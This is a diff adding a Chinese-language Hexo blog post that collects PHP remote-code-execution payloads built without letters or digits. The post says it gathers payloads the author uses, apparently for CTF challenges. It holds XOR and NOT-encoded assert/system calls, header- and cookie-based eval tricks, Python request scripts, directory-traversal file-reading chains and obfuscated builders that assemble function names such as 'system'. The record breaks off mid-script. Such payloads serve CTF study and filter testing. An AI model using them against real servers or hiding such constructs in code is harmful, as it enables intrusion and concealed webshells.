@@ -1,0 +1,657 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>无字母数字webshell - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="无字母数字webshell">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-16 20:06" pubdate>
+        2020年3月16日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      33
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">无字母数字webshell</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>收集一下平时用的payload</p>
+</blockquote>
+<h1 id="无字符"><a href="#无字符" class="headerlink" title="无字符"></a>无字符</h1><pre><code class="hljs xquery">?code=<span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;;$&#123;<span class="hljs-variable">$_</span>&#125;[<span class="hljs-number">_</span>]($&#123;<span class="hljs-variable">$_</span>&#125;[_<span class="hljs-number">_</span>]);&amp;<span class="hljs-number">_</span>=assert&amp;_<span class="hljs-number">_</span>=执行的命令   // _GET
+?code=(~<span class="hljs-meta">%9E</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%8D</span><span class="hljs-meta">%8B</span>)((~<span class="hljs-meta">%91</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%87</span><span class="hljs-meta">%8B</span>)((~<span class="hljs-meta">%98</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%93</span><span class="hljs-meta">%93</span><span class="hljs-meta">%97</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%9B</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%8D</span><span class="hljs-meta">%8C</span>)()));
+//(<span class="hljs-string">&quot;assert&quot;</span>)((<span class="hljs-string">&quot;next&quot;</span>)((<span class="hljs-string">&quot;getallheaders&quot;</span>)())); 取反操作！在UA头里面添加命令
+</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/04/24/JD8ZMq.png" srcset="/img/loading.gif" alt="JD8ZMq.png"></p>
+<p>利用缓存文件</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7742">https://xz.aliyun.com/t/7742</a></p>
+<h1 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h1><ul>
+<li><p>getallheaders()</p>
+<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()));</span>
+<span class="hljs-function">添加头部</span>
+<span class="hljs-function"><span class="hljs-variable">GS</span>: <span class="hljs-title">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);</span></code></pre>
+</li>
+<li><p>get_defined_vars()</p>
+<p>限制：apache的函数</p>
+<pre><code class="hljs routeros">可以回显全局变量
+<span class="hljs-variable">$_GET</span>
+<span class="hljs-variable">$_POST</span>
+<span class="hljs-variable">$_FILES</span>
+<span class="hljs-variable">$_COOKIE</span>
+
+利用<span class="hljs-variable">$_GET</span>
+eval(end(current(get_defined_vars())))
+同时get传一个 <span class="hljs-attribute">GS</span>=phpinfo()
+
+也可以利用<span class="hljs-variable">$_FILES</span>
+
+import requests
+<span class="hljs-keyword">from</span> io import BytesIO
+
+payload = <span class="hljs-string">&quot;system(&#x27;ls /tmp&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)
+files = &#123;
+  payload: BytesIO(<span class="hljs-string">&#x27;sky cool!&#x27;</span>)
+&#125;
+
+r = requests.post(<span class="hljs-string">&#x27;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)
+
+<span class="hljs-builtin-name">print</span> r.content</code></pre>
+</li>
+<li><p>session_id()</p>
+<pre><code class="hljs routeros">import requests
+url = <span class="hljs-string">&#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span>
+payload = <span class="hljs-string">&quot;echo &#x27;sky cool&#x27;;&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)
+cookies = &#123;
+	<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:payload
+&#125;
+r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">url</span>=url,cookies=cookies)
+<span class="hljs-builtin-name">print</span> r.content</code></pre>
+</li>
+<li><p>越目录读文件</p>
+<pre><code class="hljs mel">var_dump(scandir(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(getcwd())))))
+var_dump(scandir(<span class="hljs-keyword">dirname</span>(getcwd())));  上层目录  <span class="hljs-keyword">dirname</span>
+<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">dirname</span>(getcwd()));              更改目录  <span class="hljs-keyword">chdir</span>
+
+读根目录
+
+# 返回一个点
+
+<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">dirname</span>(getcwd())))# 这个太厉害了
+
+current(localeconv())   
+chr(<span class="hljs-keyword">ceil</span>(sinh(cosh(<span class="hljs-keyword">tan</span>(<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">sqrt</span>(<span class="hljs-keyword">floor</span>(phpversion()))))))))
+
+
+(<span class="hljs-keyword">chdir</span>(next(scandir(current(localeconv())))))  切换到上一个目录
+(<span class="hljs-keyword">chdir</span>(next(scandir(chr(pos(localtime(time(<span class="hljs-keyword">chdir</span>(next(scandir(current(localeconv())))))))))))) 切换到上上个目录
+
+(<span class="hljs-keyword">chdir</span>(next(scandir(chr(pos(localtime(time())))))))  套这个就完事
+
+# 读文件
+<span class="hljs-keyword">chdir</span>可以切换下目录，然后获取到文件名直接读就行
+show_source(array_rand(array_flip(scandir(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(getcwd())))))))))
+
+array_rand 随机取
+array_flip 键值倒过来
+
+</code></pre>
+
+
+
+
+
+</li>
+</ul>
+<p>参考 ：</p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/530.html">https://www.gem-love.com/ctf/530.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/060d16584b8e">https://www.jianshu.com/p/060d16584b8e</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mUND1lhNWIufouL4bH1o0g">https://mp.weixin.qq.com/s/mUND1lhNWIufouL4bH1o0g</a></p>
+<h1 id="添加一些奇奇怪怪的shell"><a href="#添加一些奇奇怪怪的shell" class="headerlink" title="添加一些奇奇怪怪的shell"></a>添加一些奇奇怪怪的shell</h1><p>RCTF2020Calc  <a target="_blank" rel="noopener" href="https://blog.rois.io/2020/rctf-2020-official-writeup/">https://blog.rois.io/2020/rctf-2020-official-writeup/</a></p>
+<pre><code class="hljs php"><span class="hljs-comment"># system(end(getallheaders()));</span>
+<span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">3</span>))&#123;<span class="hljs-number">1</span>&#125;));
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">9</span>))&#123;<span class="hljs-number">1</span>&#125;));
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">3</span>))&#123;<span class="hljs-number">1</span>&#125;));
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;));
+<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;);
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">-1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">0</span>&#125;));
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//systEm</span>
+<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span>
+<span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//n</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//D</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//EnD</span>
+<span class="hljs-meta">?&gt;</span>
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// getallheaders</span>
+<span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">8</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)))); <span class="hljs-comment">// g</span>
+<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;)); <span class="hljs-comment">//T</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//a</span>
+<span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">// l</span>
+<span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">// l</span>
+<span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">// h</span>
+<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//a</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//D</span>
+<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>))&#123;<span class="hljs-number">1</span>&#125;)); <span class="hljs-comment">// r</span>
+<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">3</span>))&#123;<span class="hljs-number">1</span>&#125;)); <span class="hljs-comment">// s</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>利用1/0构造的,还可以构造这样 <code>system(file_get_contents(“php://input”)); </code></p>
+<pre><code class="hljs php"><span class="hljs-comment">#得到字符脚本</span>
+chrs = <span class="hljs-string">&quot;INF0123456789-.&quot;</span>
+result = <span class="hljs-keyword">list</span>(chrs)
+recipes = [
+];
+<span class="hljs-literal">null</span> = None
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1/0).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1/0).(0))&#123;1&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1/0).(0))&#123;2&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((0).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((2).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((3).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((4).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((5).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((6).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((7).(0))&#123;0&#125;)&quot;</span>&#125;);
